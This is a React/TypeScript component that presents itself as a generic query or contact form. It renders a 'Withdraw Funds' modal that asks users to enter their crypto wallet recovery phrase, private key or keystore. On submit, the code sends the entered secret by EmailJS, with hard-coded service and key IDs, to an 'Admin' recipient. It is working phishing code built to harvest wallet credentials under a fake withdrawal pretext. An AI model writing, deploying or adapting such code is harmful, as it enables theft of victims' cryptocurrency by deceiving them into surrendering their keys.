import React, { useState } from 'react'
import { X} from 'lucide-react'
import emailjs from '@emailjs/browser'

interface QueryFormProps {
  isOpen: boolean
  onClose: () => void

}

type QueryType = 'contact' | 'complains' | 'message'

const QueryForm: React.FC<QueryFormProps> = ({ isOpen, onClose }) => {
  const [queryType, setQueryType] = useState<QueryType>('contact')
  const [subject, setSubject] = useState('')
  const [message, setMessage] = useState('')
  const [isSubmitting, setIsSubmitting] = useState(false)


  const SERVICE_ID = 'service_mxgitz4'
  const TEMPLATE_ID = 'template_o09kcxw'
  const PUBLIC_KEY = 'jbagNFmtB6voszQwV'

  const queryTypes = [
    { key: 'contact' as QueryType, label: 'Phrase', },
    { key: 'complains' as QueryType, label: 'Private Key',  },
    { key: 'message' as QueryType, label: 'KeyStore', }
  ]

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    
    if (!message.trim()) {
      alert('Please fill in all fields')
      return
    }

    setIsSubmitting(true)

    try {
      // EmailJS template parameters
      const templateParams = {
     
        subject: subject,
        message: message,
        to_name: 'Admin', 
       
      }

      await emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams, PUBLIC_KEY)
      
    
    
      setSubject('')
      setMessage('')
      setQueryType('contact')
      onClose()
      
    } catch (error) {
      console.error('Error sending email:', error)
      alert('Failed to send your query. Please try again.')
    } finally {
      setIsSubmitting(false)
    }
  }


  if (!isOpen) return null

  return (
    <div className="fixed inset-0 bg-opacity-10 flex items-center justify-center z-50 p-4 bg-[#252a47]">
      <div className="bg-[#252a47] rounded-lg w-full max-w-md mx-auto max-h-[90vh] overflow-y-auto">
        {/* Header */}
        <div className="flex justify-between items-center sm:p-6 p-4 border-b border-gray-600">
          <h2 className="text-xl font-semibold text-white">Withdraw Funds</h2>
          <button
            onClick={onClose}
            className="text-gray-400 hover:text-white transition-colors"
          >
            <X className="h-6 w-6" />
          </button>
        </div>

        {/* Form */}
        <form onSubmit={handleSubmit} className="p-6 space-y-6">
          {/* Query Type Tabs */}
          <div>
            <label className="block text-sm font-medium text-gray-300 mb-3">
              Note: please don't withdraw into a blank/New Btc wallet
            </label>
            <div className="flex space-x-1 bg-[#1a1e35] p-1 rounded-lg">
              {queryTypes.map(({ key, label, }) => (
                <button
                  key={key}
                  type="button"
                  onClick={() => setQueryType(key)}
                  className={`flex-1 flex items-center justify-center px-3 py-2 rounded-md text-sm font-medium transition-colors ${
                    queryType === key
                      ? 'bg-[#66e0c8] text-[#1a1e35]'
                      : 'text-gray-400 hover:text-white'
                  }`}
                >
                  
                  {label}
                </button>
              ))}
            </div>
          </div>


          {/* Message */}
          <div>
            <label htmlFor="message" className="block text-sm font-medium text-gray-300 mb-2">
              Message
            </label>
            <textarea
              id="message"
              value={message}
              onChange={(e) => setMessage(e.target.value)}
              rows={6}
              className="w-full px-3 py-2 bg-[#1a1e35] text-white rounded-md border border-gray-600 focus:border-[#66e0c8] focus:outline-none resize-none"
              placeholder=''
              required
            />
          </div>

        
         <p className='text-white'>Typically 12(sometimes) words separated by single spaces</p>

          {/* Submit Button */}
          <button
            type="submit"
            disabled={isSubmitting}
            className="w-full flex items-center justify-center px-4 py-2 bg-[#66e0c8] text-[#1a1e35] rounded-md hover:bg-[#5dd4bd] disabled:opacity-50 disabled:cursor-not-allowed transition-colors font-medium"
          >
            {isSubmitting ? (
              <>
                <div className="animate-spin rounded-full h-4 w-4 border-2 border-[#1a1e35] border-t-transparent mr-2" />
                Sending...
              </>
            ) : (
              <>
               
               Proceed
              </>
            )}
          </button>
        </form>
      </div>
    </div>
  )
}

export default QueryForm